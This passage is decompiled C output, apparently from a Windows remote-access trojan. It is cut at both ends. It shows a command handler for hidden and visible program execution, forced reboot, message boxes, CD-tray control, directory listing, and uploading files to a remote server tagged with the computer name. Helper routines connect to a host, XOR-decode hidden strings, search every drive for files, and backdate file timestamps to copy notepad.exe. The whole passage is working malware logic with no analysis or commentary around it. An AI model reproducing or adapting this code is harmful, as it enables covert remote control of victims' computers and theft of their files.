  LPVOID local_5b0;
  undefined4 local_5ac;
  undefined *local_598;
  undefined *local_594;
  undefined *local_590;
  undefined *local_58c;
  undefined *local_588;
  char local_57c [276];
  uint local_468 [67];
  char *local_35c [4];
  undefined local_34c [16];
  undefined local_33c [4];
  MCIDEVICEID local_338;
  char *local_334;
  char acStack_320 [4];
  uint local_31c [64];
  CHAR local_21c [256];
  uint local_11c [64];
  undefined local_1c [12];
  
  local_590 = local_1c;
  local_588 = &stack0xfffff994;
  local_598 = &DAT_0041efe0;
  local_594 = &DAT_00422e6c;
  local_58c = &DAT_004072e1;
  FUN_00421a50(&local_5b0);
  uVar14 = 0;
  uVar15 = 1;
  local_5b4 = 0;
  local_5ac = 0xffffffff;
  FUN_00408760(param_1,&local_5b4,'\0','\0',(undefined *)local_11c,0x100);
  iVar9 = 10;
  puVar11 = local_11c;
  pbVar13 = (byte *)"exec_show";
  do {
    if (iVar9 == 0) break;
    iVar9 = iVar9 + -1;
    uVar14 = *(byte *)puVar11 < *pbVar13;
    uVar15 = *(byte *)puVar11 == *pbVar13;
    puVar11 = (uint *)((int)puVar11 + 1);
    pbVar13 = pbVar13 + 1;
  } while ((bool)uVar15);
  if ((bool)uVar15) {
    local_5bc = (undefined4 *)FUN_0041f7e0(0x20);
    FUN_00408760(param_1,&local_5b4,'\"','\"',local_21c,0x100);
    FUN_00408760(param_1,&local_5b4,'\"','\"',(undefined *)local_31c,0x100);
    pHVar4 = ShellExecuteA((HWND)0x0,"open",local_21c,(LPCSTR)local_31c,(LPCSTR)0x0,5);
    local_5b8 = local_5bc;
    if (pHVar4 == (HINSTANCE)0x2) {
      *local_5bc = 0x454c4946;
      local_5bc[1] = 0x544f4e20;
      local_5bc[2] = 0x554f4620;
      *(undefined2 *)(local_5bc + 3) = 0x444e;
      *(undefined *)((int)local_5bc + 0xe) = 0;
    }
    else {
      *(undefined2 *)local_5bc = 0x4b4f;
      *(undefined *)((int)local_5bc + 2) = 0;
    }
LAB_00406885:
    FUN_00421b30(&local_5b0);
    return local_5b8;
  }
  iVar9 = 10;
  puVar11 = local_11c;
  pbVar13 = (byte *)"exec_hide";
  do {
    if (iVar9 == 0) break;
    iVar9 = iVar9 + -1;
    uVar14 = *(byte *)puVar11 < *pbVar13;
    uVar15 = *(byte *)puVar11 == *pbVar13;
    puVar11 = (uint *)((int)puVar11 + 1);
    pbVar13 = pbVar13 + 1;
  } while ((bool)uVar15);
  if ((bool)uVar15) {
    local_5ac = 0xffffffff;
    local_5c0 = (undefined4 *)FUN_0041f7e0(0x20);
    FUN_00408760(param_1,&local_5b4,'\"','\"',(undefined *)local_31c,0x100);
    FUN_00408760(param_1,&local_5b4,'\"','\"',local_21c,0x100);
    pHVar4 = ShellExecuteA((HWND)0x0,"open",(LPCSTR)local_31c,local_21c,(LPCSTR)0x0,0);
    local_5b8 = local_5c0;
    if (pHVar4 == (HINSTANCE)0x2) {
      *local_5c0 = 0x454c4946;
      local_5c0[1] = 0x544f4e20;
      local_5c0[2] = 0x554f4620;
      *(undefined2 *)(local_5c0 + 3) = 0x444e;
      *(undefined *)((int)local_5c0 + 0xe) = 0;
    }
    else {
      *(undefined2 *)local_5c0 = 0x4b4f;
      *(undefined *)((int)local_5c0 + 2) = 0;
    }
  }
  else {
    iVar9 = 7;
    puVar11 = local_11c;
    pbVar13 = (byte *)"reboot";
    do {
      if (iVar9 == 0) break;
      iVar9 = iVar9 + -1;
      uVar14 = *(byte *)puVar11 < *pbVar13;
      uVar15 = *(byte *)puVar11 == *pbVar13;
      puVar11 = (uint *)((int)puVar11 + 1);
      pbVar13 = pbVar13 + 1;
    } while ((bool)uVar15);
    if ((bool)uVar15) {
      local_5ac = 0xffffffff;
      ShellExecuteA((HWND)0x0,"open","shutdown","/r /t 0",(LPCSTR)0x0,0);
      local_5b8 = (undefined4 *)FUN_0041f7e0(0x20);
      *local_5b8 = 0x54535953;
      local_5b8[1] = 0x47204d45;
      local_5b8[2] = 0x474e494f;
      local_5b8[3] = 0x524f4620;
      local_5b8[4] = 0x42455220;
      local_5b8[5] = 0x20544f4f;
      local_5b8[6] = 0x574f4e;
    }
    else {
      iVar9 = 7;
      puVar11 = local_11c;
      pbVar13 = (byte *)"msgbox";
      do {
        if (iVar9 == 0) break;
        iVar9 = iVar9 + -1;
        uVar14 = *(byte *)puVar11 < *pbVar13;
        uVar15 = *(byte *)puVar11 == *pbVar13;
        puVar11 = (uint *)((int)puVar11 + 1);
        pbVar13 = pbVar13 + 1;
      } while ((bool)uVar15);
      if ((bool)uVar15) {
        local_5ac = 0xffffffff;
        FUN_00408760(param_1,&local_5b4,'\"','\"',(undefined *)local_31c,0x100);
        FUN_00408760(param_1,&local_5b4,'\"','\"',local_21c,0x100);
        MessageBoxA((HWND)0x0,(LPCSTR)local_31c,local_21c,0x40);
        local_5b8 = (undefined4 *)FUN_0041f7e0(0x20);
        *local_5b8 = 0x5353454d;
        local_5b8[1] = 0x42454741;
        local_5b8[2] = 0x4420584f;
        local_5b8[3] = 0x4c505349;
        local_5b8[4] = 0x44455941;
        *(undefined *)(local_5b8 + 5) = 0;
      }
      else {
        iVar9 = 10;
        puVar11 = local_11c;
        pbVar13 = (byte *)"tray_open";
        do {
          if (iVar9 == 0) break;
          iVar9 = iVar9 + -1;
          uVar14 = *(byte *)puVar11 < *pbVar13;
          uVar15 = *(byte *)puVar11 == *pbVar13;
          puVar11 = (uint *)((int)puVar11 + 1);
          pbVar13 = pbVar13 + 1;
        } while ((bool)uVar15);
        if ((bool)uVar15) {
          local_334 = "CDAudio";
          local_5ac = 0xffffffff;
          mciSendCommandA(0,0x803,0x2000,(DWORD_PTR)local_33c);
          local_5c4 = local_338;
          mciSendCommandA(local_338,0x80d,0x100,(DWORD_PTR)local_34c);
          mciSendCommandA(local_5c4,0x804,1,(DWORD_PTR)local_34c);
          local_5b8 = (undefined4 *)FUN_0041f7e0(0x20);
          *local_5b8 = 0x442f4443;
          local_5b8[1] = 0x54204456;
          local_5b8[2] = 0x20594152;
          local_5b8[3] = 0x4e45504f;
        }
        else {
          iVar9 = 0xb;
          puVar11 = local_11c;
          pbVar13 = (byte *)"tray_close";
          do {
            if (iVar9 == 0) break;
            iVar9 = iVar9 + -1;
            uVar14 = *(byte *)puVar11 < *pbVar13;
            uVar15 = *(byte *)puVar11 == *pbVar13;
            puVar11 = (uint *)((int)puVar11 + 1);
            pbVar13 = pbVar13 + 1;
          } while ((bool)uVar15);
          if (!(bool)uVar15) {
            iVar9 = 3;
            puVar11 = local_11c;
            pbVar13 = &DAT_00424897;
            do {
              if (iVar9 == 0) break;
              iVar9 = iVar9 + -1;
              uVar14 = *(byte *)puVar11 < *pbVar13;
              uVar15 = *(byte *)puVar11 == *pbVar13;
              puVar11 = (uint *)((int)puVar11 + 1);
              pbVar13 = pbVar13 + 1;
            } while ((bool)uVar15);
            if ((bool)uVar15) {
              local_5ac = 0xffffffff;
              FUN_00408760(param_1,&local_5b4,'\"','\"',(undefined *)local_31c,0x100);
              puVar11 = local_31c;
              do {
                puVar10 = puVar11;
                puVar11 = puVar10 + 1;
                uVar12 = *puVar10 + 0xfefefeff & ~*puVar10;
                uVar3 = uVar12 & 0x80808080;
              } while (uVar3 == 0);
              if ((uVar12 & 0x8080) == 0) {
                uVar3 = uVar3 >> 0x10;
                puVar11 = (uint *)((int)puVar10 + 6);
              }
              if (*(char *)((int)puVar11 +
                           (int)(acStack_320 +
                                (-(int)local_31c - (uint)CARRY1((byte)uVar3,(byte)uVar3)))) != '\\')
              {
                sVar5 = strlen((char *)local_31c);
                *(undefined2 *)((int)local_31c + sVar5) = 0x5c;
              }
              local_5ac = 0xffffffff;
              BVar7 = PathFileExistsA((LPCSTR)local_31c);
              if (BVar7 == 0) {
                local_5ac = 0xffffffff;
                local_5b8 = (undefined4 *)FUN_0041f7e0(0x20);
                *local_5b8 = 0x20524944;
                local_5b8[1] = 0x20544f4e;
                local_5b8[2] = 0x4e554f46;
                *(undefined2 *)(local_5b8 + 3) = 0x44;
                local_5cc = local_5b8;
              }
              else {
                local_5d0 = &stack0xfffff994;
                FUN_00408670(local_35c);
                local_5ac = 1;
                FUN_004086e0(local_35c,0x42490a,0x10);
                puVar11 = local_31c;
                do {
                  uVar3 = *puVar11;
                  puVar11 = puVar11 + 1;
                } while ((uVar3 + 0xfefefeff & ~uVar3 & 0x80808080) == 0);
                FUN_00421910();
                local_5d4 = acStack_650;
                local_5ac = 1;
                sprintf(local_5d4,"%s*.*");
                local_5d8 = _findfirst();
                if (local_5d8 != 0) {
                  do {
                    puVar11 = local_468;
                    do {
                      puVar10 = puVar11;
                      puVar11 = puVar10 + 1;
                      uVar12 = *puVar10 + 0xfefefeff & ~*puVar10;
                      uVar3 = uVar12 & 0x80808080;
                    } while (uVar3 == 0);
                    if ((uVar12 & 0x8080) == 0) {
                      uVar3 = uVar3 >> 0x10;
                      puVar11 = (uint *)((int)puVar10 + 6);
                    }
                    local_5ac = 1;
                    FUN_004086e0(local_35c,(int)local_468,
                                 (int)puVar11 +
                                 ((-3 - (uint)CARRY1((byte)uVar3,(byte)uVar3)) - (int)local_468));
                    FUN_004086e0(local_35c,0x424921,1);
                    iVar9 = _findnext();
                  } while (iVar9 == 0);
                  local_5ac = 1;
                  _findclose(local_5d8);
                }
                sVar5 = strlen(local_35c[0]);
                local_5ac = 1;
                local_5cc = (undefined4 *)FUN_0041f7e0(sVar5 + 1);
                strcpy((char *)local_5cc,local_35c[0]);
                local_5ac = 0xffffffff;
                FUN_004086c0(local_35c);
                local_5b8 = local_5cc;
              }
            }
            else {
              iVar9 = 7;
              puVar11 = local_11c;
              pbVar13 = (byte *)"upload";
              do {
                if (iVar9 == 0) break;
                iVar9 = iVar9 + -1;
                uVar14 = *(byte *)puVar11 < *pbVar13;
                uVar15 = *(byte *)puVar11 == *pbVar13;
                puVar11 = (uint *)((int)puVar11 + 1);
                pbVar13 = pbVar13 + 1;
              } while ((bool)uVar15);
              if (!(bool)uVar15) {
                iVar9 = 9;
                puVar11 = local_11c;
                pbVar13 = (byte *)"download";
                do {
                  if (iVar9 == 0) break;
                  iVar9 = iVar9 + -1;
                  uVar14 = *(byte *)puVar11 < *pbVar13;
                  uVar15 = *(byte *)puVar11 == *pbVar13;
                  puVar11 = (uint *)((int)puVar11 + 1);
                  pbVar13 = pbVar13 + 1;
                } while ((bool)uVar15);
                if ((bool)uVar15) {
                  local_5ac = 0xffffffff;
                  local_5fc = (undefined4 *)FUN_0041f7e0(0x20);
                  FUN_00408760(param_1,&local_5b4,'\"','\"',(undefined *)local_31c,0x100);
                  FUN_00408760(param_1,&local_5b4,'\"','\"',local_21c,0x100);
                  FUN_00408760(param_1,&local_5b4,'\"','\"',local_57c,0x100);
                  cVar1 = FUN_00403a30(local_31c,local_21c,local_57c);
                  local_5b8 = local_5fc;
                  if (cVar1 == '\0') {
                    *local_5fc = 0x4e574f44;
                    local_5fc[1] = 0x44414f4c;
                    local_5fc[2] = 0x49414620;
                    local_5fc[3] = 0x44454c;
                  }
                  else {
                    *local_5fc = 0x454c4946;
                    local_5fc[1] = 0x574f4420;
                    local_5fc[2] = 0x414f4c4e;
                    local_5fc[3] = 0x444544;
                  }
                }
                else {
                  iVar9 = 0x12;
                  puVar11 = local_11c;
                  pbVar13 = (byte *)"lock_distribution";
                  do {
                    if (iVar9 == 0) break;
                    iVar9 = iVar9 + -1;
                    uVar14 = *(byte *)puVar11 < *pbVar13;
                    uVar15 = *(byte *)puVar11 == *pbVar13;
                    puVar11 = (uint *)((int)puVar11 + 1);
                    pbVar13 = pbVar13 + 1;
                  } while ((bool)uVar15);
                  if ((bool)uVar15) {
                    local_5ac = 0xffffffff;
                    local_600 = (undefined4 *)FUN_0041f7e0(0x20);
                    pCVar6 = (LPCSTR)FUN_004079f0(0x2f);
                    BVar7 = PathFileExistsA(pCVar6);
                    if (BVar7 == 0) {
                      pcVar8 = (char *)FUN_004079f0(0x2f);
                      _File = fopen(pcVar8,"w");
                      if (_File == (FILE *)0x0) {
                        *local_600 = 0x4c494146;
                        *(undefined2 *)(local_600 + 1) = 0x4445;
                        *(undefined *)((int)local_600 + 6) = 0;
                        local_5b8 = local_600;
                      }
                      else {
                        *(undefined2 *)local_600 = 0x4b4f;
                        *(undefined *)((int)local_600 + 2) = 0;
                        fclose(_File);
                        local_5b8 = local_600;
                      }
                    }
                    else {
                      *local_600 = 0x45524c41;
                      local_600[1] = 0x20594441;
                      local_600[2] = 0x4b434f4c;
                      *(undefined2 *)(local_600 + 3) = 0x4445;
                      *(undefined *)((int)local_600 + 0xe) = 0;
                      local_5b8 = local_600;
                    }
                  }
                  else {
                    iVar9 = 0x14;
                    puVar11 = local_11c;
                    pbVar13 = (byte *)"unlock_distribution";
                    do {
                      if (iVar9 == 0) break;
                      iVar9 = iVar9 + -1;
                      uVar14 = *(byte *)puVar11 < *pbVar13;
                      uVar15 = *(byte *)puVar11 == *pbVar13;
                      puVar11 = (uint *)((int)puVar11 + 1);
                      pbVar13 = pbVar13 + 1;
                    } while ((bool)uVar15);
                    if ((bool)uVar15) {
                      local_5ac = 0xffffffff;
                      local_604 = (undefined4 *)FUN_0041f7e0(0x20);
                      pCVar6 = (LPCSTR)FUN_004079f0(0x2f);
                      BVar7 = PathFileExistsA(pCVar6);
                      if (BVar7 == 0) {
                        *local_604 = 0x45524c41;
                        local_604[1] = 0x20594441;
                        local_604[2] = 0x4f4c4e55;
                        local_604[3] = 0x44454b43;
                        *(undefined *)(local_604 + 4) = 0;
                        local_5b8 = local_604;
                      }
                      else {
                        pcVar8 = (char *)FUN_004079f0(0x2f);
                        remove(pcVar8);
                        *(undefined2 *)local_604 = 0x4b4f;
                        *(undefined *)((int)local_604 + 2) = 0;
                        local_5b8 = local_604;
                      }
                    }
                    else {
                      iVar9 = 5;
                      puVar11 = local_11c;
                      pbVar13 = &DAT_004248d0;
                      do {
                        if (iVar9 == 0) break;
                        iVar9 = iVar9 + -1;
                        uVar14 = *(byte *)puVar11 < *pbVar13;
                        uVar15 = *(byte *)puVar11 == *pbVar13;
                        puVar11 = (uint *)((int)puVar11 + 1);
                        pbVar13 = pbVar13 + 1;
                      } while ((bool)uVar15);
                      puVar11 = local_11c;
                      if ((!(bool)uVar14 && !(bool)uVar15) == (bool)uVar14) {
                        local_5ac = 0xffffffff;
                    // WARNING: Subroutine does not return
                        exit(0);
                      }
                      do {
                        puVar10 = puVar11;
                        puVar11 = puVar10 + 1;
                        uVar12 = *puVar10 + 0xfefefeff & ~*puVar10;
                        uVar3 = uVar12 & 0x80808080;
                      } while (uVar3 == 0);
                      if ((uVar12 & 0x8080) == 0) {
                        uVar3 = uVar3 >> 0x10;
                        puVar11 = (uint *)((int)puVar10 + 6);
                      }
                      local_5ac = 0xffffffff;
                      local_608 = (undefined4 *)
                                  FUN_0041f7e0((int)puVar11 +
                                               (-(int)local_11c -
                                               (uint)CARRY1((byte)uVar3,(byte)uVar3)) + 0x1d);
                      sprintf((char *)local_608,"UNKNOWN COMMAND - \"%s\"");
                      local_5b8 = local_608;
                    }
                  }
                }
                goto LAB_00406885;
              }
              puVar11 = local_31c;
              local_5ac = 0xffffffff;
              local_5e4 = &stack0xfffff994;
              FUN_00408760(param_1,&local_5b4,'\"','\"',(undefined *)local_31c,0x100);
              local_5e0 = FUN_004047c0();
              pcVar8 = (char *)FUN_004079f0(0x30);
              local_5e8 = strlen(pcVar8);
              _Str = FUN_00408180();
              strlen(_Str);
              do {
                uVar3 = *puVar11;
                puVar11 = puVar11 + 1;
              } while ((uVar3 + 0xfefefeff & ~uVar3 & 0x80808080) == 0);
              FUN_00421910();
              local_5ec = acStack_650;
              local_5ac = 0xffffffff;
              BVar7 = PathFileExistsA((LPCSTR)local_31c);
              if (BVar7 == 0) {
                if (local_5e0 != (char *)0x0) {
                  FUN_0041f880(local_5e0);
                }
                local_5ac = 0xffffffff;
                local_5b8 = (undefined4 *)FUN_0041f7e0(0x20);
                *local_5b8 = 0x454c4946;
                local_5b8[1] = 0x544f4e20;
                local_5b8[2] = 0x554f4620;
                *(undefined2 *)(local_5b8 + 3) = 0x444e;
                *(undefined *)((int)local_5b8 + 0xe) = 0;
              }
              else {
                puVar11 = local_31c;
                do {
                  uVar3 = *puVar11;
                  puVar11 = puVar11 + 1;
                } while ((uVar3 + 0xfefefeff & ~uVar3 & 0x80808080) == 0);
                FUN_00421910();
                puVar11 = local_31c;
                local_5f0 = acStack_650;
                do {
                  uVar3 = *puVar11;
                  puVar11 = puVar11 + 1;
                } while ((uVar3 + 0xfefefeff & ~uVar3 & 0x80808080) == 0);
                FUN_00421910();
                local_5f4 = acStack_650;
                local_5ac = 0xffffffff;
                _splitpath((char *)local_31c,(char *)0x0,(char *)0x0,local_5f0,local_5f4);
                local_5f8 = FUN_00408180();
                FUN_004079f0(0x30);
                sprintf(local_5ec,"%s?comp=%s&ext=%s.%s");
                while( true ) {
                  pcVar8 = local_5e0;
                  local_5ac = 0xffffffff;
                  bVar2 = FUN_00403c70(local_5e0,local_5ec,"upload_file",(LPCSTR)local_31c,
                                       "application/octet-stream");
                  if (bVar2) break;
                  local_5ac = 0xffffffff;
                  Sleep(30000);
                }
                if (pcVar8 != (char *)0x0) {
                  FUN_0041f880(pcVar8);
                }
                local_5ac = 0xffffffff;
                local_5b8 = (undefined4 *)FUN_0041f7e0(0x20);
                *local_5b8 = 0x454c4946;
                local_5b8[1] = 0x4c505520;
                local_5b8[2] = 0x4544414f;
                *(undefined2 *)(local_5b8 + 3) = 0x44;
              }
            }
            goto LAB_00406784;
          }
          local_334 = "CDAudio";
          local_5ac = 0xffffffff;
          mciSendCommandA(0,0x803,0x2000,(DWORD_PTR)local_33c);
          local_5c8 = local_338;
          mciSendCommandA(local_338,0x80d,0x200,(DWORD_PTR)local_34c);
          mciSendCommandA(local_5c8,0x804,1,(DWORD_PTR)local_34c);
          local_5b8 = (undefined4 *)FUN_0041f7e0(0x20);
          *local_5b8 = 0x442f4443;
          local_5b8[1] = 0x54204456;
          local_5b8[2] = 0x20594152;
          local_5b8[3] = 0x534f4c43;
        }
        *(undefined2 *)(local_5b8 + 4) = 0x4445;
        *(undefined *)((int)local_5b8 + 0x12) = 0;
      }
    }
  }
LAB_00406784:
  FUN_00421b30(&local_5b0);
  return local_5b8;
}



void __cdecl FUN_004075c0(LPWSADATA param_1,char *param_2,u_short param_3)

{
  char **ppcVar1;
  u_short uVar2;
  int iVar3;
  SOCKET SVar4;
  hostent *phVar5;
  
  iVar3 = WSAStartup(0x101,param_1);
  if (-1 < iVar3) {
    SVar4 = socket(2,1,0);
    param_1[1].wVersion = (short)SVar4;
    param_1[1].wHighVersion = (short)(SVar4 >> 0x10);
    if (SVar4 != 0xffffffff) {
      phVar5 = gethostbyname(param_2);
      *(hostent **)(param_1[1].szDescription + 0x10) = phVar5;
      if (phVar5 != (hostent *)0x0) {
        ppcVar1 = phVar5->h_addr_list;
        *(undefined2 *)param_1[1].szDescription = 2;
        *(undefined4 *)(param_1[1].szDescription + 4) = *(undefined4 *)*ppcVar1;
        uVar2 = htons(param_3);
        *(u_short *)(param_1[1].szDescription + 2) = uVar2;
        SVar4._0_2_ = param_1[1].wVersion;
        SVar4._2_2_ = param_1[1].wHighVersion;
        connect(SVar4,(sockaddr *)param_1[1].szDescription,0x10);
        return;
      }
    }
  }
  return;
}



void __cdecl FUN_004076a0(int param_1)

{
  closesocket(*(SOCKET *)(param_1 + 400));
  return;
}



void __cdecl FUN_004076f0(int param_1,char *param_2,int param_3)

{
  send(*(SOCKET *)(param_1 + 400),param_2,param_3,0);
  return;
}



undefined4 __cdecl FUN_004079f0(int param_1)

{
  byte bVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  int local_1c;
  void *local_14;
  
  if (DAT_00428130 == '\0') {
    local_1c = 0x30;
    iVar5 = 0;
    do {
      uVar2 = *(uint *)((int)&DAT_00424ba4 + iVar5);
      local_14 = FUN_0041f7e0(uVar2 + 1);
      uVar4 = 0;
      if (uVar2 != 0) {
        bVar1 = (&DAT_00424ba0)[iVar5];
        iVar3 = *(int *)((int)&PTR_DAT_00424ba8 + iVar5);
        do {
          *(byte *)(uVar4 + (int)local_14) = bVar1 ^ *(byte *)(uVar4 + iVar3);
          uVar4 = uVar4 + 1;
        } while (uVar4 < uVar2);
      }
      *(undefined *)(uVar4 + (int)local_14) = 0;
      if (DAT_00428138 == DAT_0042813c) {
        FUN_00422cd0((void **)&DAT_00428134,DAT_00428138,&local_14);
      }
      else {
        if (DAT_00428138 != (void **)0x0) {
          *DAT_00428138 = local_14;
        }
        DAT_00428138 = DAT_00428138 + 1;
      }
      iVar5 = iVar5 + 0xc;
      local_1c = local_1c + -1;
    } while (-1 < local_1c);
    DAT_00428130 = '\x01';
  }
  return *(undefined4 *)(param_1 * 4 + DAT_00428134);
}



void __fastcall FUN_00407ac0(undefined4 param_1,int param_2)

{
  int in_EAX;
  
  if (in_EAX == 1 && param_2 == 0xffff) {
    DAT_00428134 = (void *)0x0;
    DAT_00428138 = 0;
    DAT_0042813c = 0;
  }
  if ((in_EAX == 0 && param_2 == 0xffff) && (DAT_00428134 != (void *)0x0)) {
    FUN_0041f7c0(DAT_00428134);
  }
  return;
}



void __fastcall FUN_00407b30(undefined4 param_1)

{
  FUN_00407ac0(param_1,0xffff);
  return;
}



void __cdecl FUN_00407e50(char *param_1,char *param_2,undefined *param_3)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint *puVar4;
  char *pcVar5;
  bool bVar6;
  char acStack_270 [4];
  undefined *local_26c;
  int local_268;
  char *local_264;
  undefined *local_260;
  byte local_25c;
  char local_248;
  byte local_13c;
  uint local_128 [70];
  
  local_260 = &stack0xfffffd74;
  strlen(param_1);
  strlen(param_2);
  FUN_00421910();
  local_264 = acStack_270;
  sprintf(local_264,"%s*");
  local_268 = _findfirst();
  if (local_268 != 0) {
    do {
      bVar6 = (local_13c & 0x10) == 0;
      if (!bVar6) {
        iVar3 = 2;
        puVar4 = local_128;
        pcVar5 = ".";
        do {
          if (iVar3 == 0) break;
          iVar3 = iVar3 + -1;
          bVar6 = *(char *)puVar4 == *pcVar5;
          puVar4 = (uint *)((int)puVar4 + 1);
          pcVar5 = pcVar5 + 1;
        } while (bVar6);
        if (!bVar6) {
          iVar3 = 3;
          puVar4 = local_128;
          pcVar5 = "..";
          do {
            if (iVar3 == 0) break;
            iVar3 = iVar3 + -1;
            bVar6 = *(char *)puVar4 == *pcVar5;
            puVar4 = (uint *)((int)puVar4 + 1);
            pcVar5 = pcVar5 + 1;
          } while (bVar6);
          if ((!bVar6) && ((char)local_128[0] != '\0')) {
            strlen(param_1);
            puVar4 = local_128;
            do {
              uVar1 = *puVar4;
              puVar4 = puVar4 + 1;
            } while ((uVar1 + 0xfefefeff & ~uVar1 & 0x80808080) == 0);
            FUN_00421910();
            sprintf(acStack_270,"%s%s\\");
            FUN_00407e50(acStack_270,param_2,param_3);
          }
        }
      }
      iVar3 = _findnext();
    } while (iVar3 == 0);
    _findclose(local_268);
  }
  sprintf(local_264,"%s%s");
  iVar3 = _findfirst();
  if (iVar3 != 0) {
    do {
      if (((local_25c & 0x10) == 0) && (local_248 != '\0')) {
        local_26c = &stack0xfffffd74;
        strlen(param_1);
        puVar4 = (uint *)&local_248;
        do {
          uVar1 = *puVar4;
          puVar4 = puVar4 + 1;
        } while ((uVar1 + 0xfefefeff & ~uVar1 & 0x80808080) == 0);
        FUN_00421910();
        sprintf(acStack_270,"%s%s");
        (*(code *)param_3)();
      }
      iVar2 = _findnext();
    } while (iVar2 == 0);
    _findclose(iVar3);
  }
  return;
}



void __cdecl FUN_00408110(char *param_1,undefined *param_2)

{
  BOOL BVar1;
  char cVar2;
  char local_1c [12];
  
  cVar2 = 'A';
  do {
    while( true ) {
      sprintf(local_1c,"%c:\\",(int)cVar2);
      BVar1 = PathFileExistsA(local_1c);
      if (BVar1 != 0) break;
      cVar2 = cVar2 + '\x01';
      if ('Z' < cVar2) {
        return;
      }
    }
    cVar2 = cVar2 + '\x01';
    FUN_00407e50(local_1c,param_1,param_2);
  } while (cVar2 < '[');
  return;
}



LPSTR FUN_00408180(void)

{
  DWORD local_8;
  
  if (DAT_00428144 != '\0') {
    return DAT_00428140;
  }
  DAT_00428140 = (LPSTR)FUN_0041f7e0(0x100);
  local_8 = 0x100;
  GetComputerNameA(DAT_00428140,&local_8);
  DAT_00428144 = 1;
  return DAT_00428140;
}



undefined __cdecl FUN_004081d0(char *param_1,char *param_2,char param_3)

{
  FILE *pFVar1;
  FILE *_File;
  undefined local_12;
  undefined local_11;
  
  if (param_3 != '\0') {
    pFVar1 = fopen(param_2,"r");
    if (pFVar1 != (FILE *)0x0) {
      fclose(pFVar1);
      return 0;
    }
  }
  local_12 = 0;
  pFVar1 = fopen(param_1,"rb");
  if (pFVar1 != (FILE *)0x0) {
    _File = fopen(param_2,"wb");
    if (_File != (FILE *)0x0) {
      if ((*(byte *)&pFVar1->_flag & 0x10) == 0) {
        do {
          fread(&local_11,1,1,pFVar1);
          fwrite(&local_11,1,1,_File);
        } while ((*(byte *)&pFVar1->_flag & 0x10) == 0);
      }
      local_12 = 1;
      fclose(_File);
    }
    fclose(pFVar1);
  }
  return local_12;
}



void __cdecl FUN_004082d0(LPCSTR param_1)

{
  char *_Str;
  HANDLE pvVar1;
  undefined8 local_b4;
  _OFSTRUCT local_ac;
  
  _Str = getenv("SYSTEMROOT");
  strlen(_Str);
  FUN_00421910();
  getenv("SYSTEMROOT");
  sprintf((char *)((int)&local_b4 + 4),"%s\\notepad.exe");
  pvVar1 = (HANDLE)OpenFile((char *)((int)&local_b4 + 4),&local_ac,0);
  if (pvVar1 != (HANDLE)0xffffffff) {
    GetFileTime(pvVar1,(LPFILETIME)&local_b4,(LPFILETIME)0x0,(LPFILETIME)0x0);
    CloseHandle(pvVar1);
    pvVar1 = (HANDLE)OpenFile(param_1,&local_ac,2);
    if (pvVar1 != (HANDLE)0xffffffff) {
      SetFileTime(pvVar1,(LPFILETIME)&local_b4,(FILETIME *)0x0,(FILETIME *)0x0);
      CloseHandle(pvVar1);
    }
  }
  return;
}



char * __cdecl FUN_004083d0(uint param_1,char *param_2)

{
  size_t sVar1;
  char *_Dest;
  int iVar2;
  int iVar3;
  time_t tVar4;
  undefined8 local_24;
  char local_18;
  
  tVar4 = time((time_t *)0x0);
  srand((uint)tVar4);
  sVar1 = strlen(param_2);
  if (0x104 - sVar1 < param_1) {
    param_1 = 0x103 - sVar1;
  }
  _Dest = (char *)FUN_0041f7e0(0x104);
  iVar2 = 0;
  do {
    _Dest[iVar2] = '\0';
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x104);
  iVar2 = 0;
  if (0 < (int)param_1) {
    do {
      iVar3 = rand();
      local_18 = (char)iVar3 + ((char)(local_24._4_4_ >> 3) - (char)(iVar3 >> 0x1f)) * -0x1a;
      _Dest[iVar2] = local_18 + 'a';
      iVar2 = iVar2 + 1;
      local_24 = (longlong)iVar3 * 0x4ec4ec4f;
    } while (iVar2 < (int)param_1);
  }
  strcat(_Dest,param_2);
  return _Dest;
}



void * __cdecl FUN_00408490(char *param_1,size_t *param_2)

{
  FILE *_File;
  void *pvVar1;
  size_t sVar2;
  int iVar3;
  int iVar4;
  
  _File = fopen(param_1,"rb");
  pvVar1 = (void *)0x0;
  if (_File != (FILE *)0x0) {
    fseek(_File,0,2);
    sVar2 = ftell(_File);
    *param_2 = sVar2;
    fseek(_File,0,0);
    iVar4 = 0;
    pvVar1 = FUN_0041f7e0(*param_2);
    if (0 < (int)*param_2) {
      do {
        iVar3 = fgetc(_File);
        *(char *)(iVar4 + (int)pvVar1) = (char)iVar3;
        iVar4 = iVar4 + 1;
      } while (iVar4 < (int)*param_2);
    }
  }
  return pvVar1;
}



void __cdecl FUN_00408560(void **param_1)

{
  void *pvVar1;
  
  pvVar1 = malloc(1);
  *param_1 = pvVar1;
  param_1[1] = (void *)0x0;
  return;
}



void __cdecl FUN_004085b0(void **param_1)

{
  free(*param_1);
  param_1[1] = (void *)0x0;
  return;
}



void __cdecl FUN_004085d0(void **param_1,int param_2,int param_3)

{
  undefined *puVar1;
  void *pvVar2;
  void *pvVar3;
  void *pvVar4;
  int iVar5;
  
  iVar5 = 0;
  pvVar2 = realloc(*param_1,param_3 + (int)param_1[1]);
  *param_1 = pvVar2;
  pvVar3 = param_1[1];
  pvVar4 = pvVar3;
  if ((int)pvVar3 < param_3 + (int)pvVar3) {
    while( true ) {
      puVar1 = (undefined *)(iVar5 + param_2);
      iVar5 = iVar5 + 1;
      *(undefined *)((int)pvVar4 + (int)pvVar2) = *puVar1;
      pvVar3 = param_1[1];
      pvVar4 = (void *)((int)pvVar4 + 1);
      if ((int)pvVar3 + param_3 <= (int)pvVar4) break;
      pvVar2 = *param_1;
    }
  }
  param_1[1] = (void *)((int)pvVar3 + param_3);
  return;
}



undefined4 __cdecl FUN_00408670(void **param_1)

{
  void *pvVar1;
  undefined4 uVar2;
  
  uVar2 = 1;
  pvVar1 = malloc(1);
  *param_1 = pvVar1;
  param_1[1] = (void *)0x0;
  return uVar2;
}



void * __cdecl FUN_004086c0(void **param_1)

{
  void *_Memory;
  
  _Memory = *param_1;
  free(_Memory);
  param_1[1] = (void *)0x0;
  return _Memory;
}



void __cdecl FUN_004086e0(void **param_1,int param_2,int param_3)

{
  undefined *puVar1;
  void *pvVar2;
  void *pvVar3;
  void *pvVar4;
  int iVar5;
  
  iVar5 = 0;
  pvVar2 = realloc(*param_1,(int)param_1[1] + param_3 + 1);
  *param_1 = pvVar2;
  pvVar3 = param_1[1];
  pvVar4 = pvVar3;
